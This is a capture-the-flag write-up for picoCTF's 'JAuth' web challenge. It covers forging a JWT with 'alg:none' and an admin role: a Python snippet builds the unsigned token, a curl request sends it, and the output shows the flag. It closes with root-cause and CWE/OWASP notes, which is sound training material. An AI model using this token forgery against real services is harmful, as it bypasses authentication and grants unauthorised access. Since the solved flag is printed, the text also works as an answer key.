# JAuth

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}`

## Summary

A bank-themed app authenticates users with a JWT stored in an `httponly` cookie. The JWT
library in use accepts the `alg: none` algorithm, which per the JWT spec means "no signature at
all." Since the server never rejects unsigned tokens, an attacker who can read the structure of
a normal token (trivial, JWTs are just base64-encoded JSON, not encrypted) can forge one with
any claims they want, including an elevated `role`, and the server accepts it as valid.

## Discovery

Logging in with the given `test`/`Test123!` credentials returns a `token` cookie. Decoding it
(standard base64, no secret needed to read a JWT's contents) shows:

```json
{"typ":"JWT","alg":"HS256"}
{"auth":1786723720818,"agent":"curl/8.21.0","role":"user","iat":1786723721}
```

`role` is plainly the authorization field, and it's directly readable and, it turns out,
directly forgeable. `GET /private` with this token just shows a generic "nothing to see here"
page for the `user` role.

## Proof of Concept

Build a new token with `alg` set to `none`, a trailing empty signature segment (the exact format
libraries expect for an intentionally unsigned token), and `role` changed to `admin`:

```python
import base64, json

def b64(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()

header = {"typ": "JWT", "alg": "none"}
payload = {"auth": 1786723720818, "agent": "curl/8.21.0", "role": "admin", "iat": 1786723721}
token = f"{b64(header)}.{b64(payload)}."
```

```
curl -s "http://TARGET/private" -H "Cookie: token=<forged token>"
```

```html
<h1>Hello, admin! You have logged in as admin!</h1>
<span>picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}</span>
```

The server accepts the completely unsigned token and grants the elevated role encoded inside it.

## Root Cause

The JWT verification library (or its configuration) permits the `none` algorithm, which by
design means "trust this token's claims with no cryptographic verification whatsoever." Since
JWT payloads are only base64-encoded, not encrypted, any claim inside one, including an
authorization-relevant field like `role`, is both fully readable and, once signature enforcement
is bypassable, fully attacker-controllable.

## CWE / OWASP

- **CWE-347**: Improper Verification of Cryptographic Signature
- **CWE-347** overlaps with the well-known "JWT `alg:none`" class of vulnerability, present in
  several real-world JWT library defaults/misconfigurations historically (matching the
  challenge's framing about unpatched/misused third-party components).
- **OWASP A02:2021**: Cryptographic Failures
- **OWASP A07:2021**: Identification and Authentication Failures
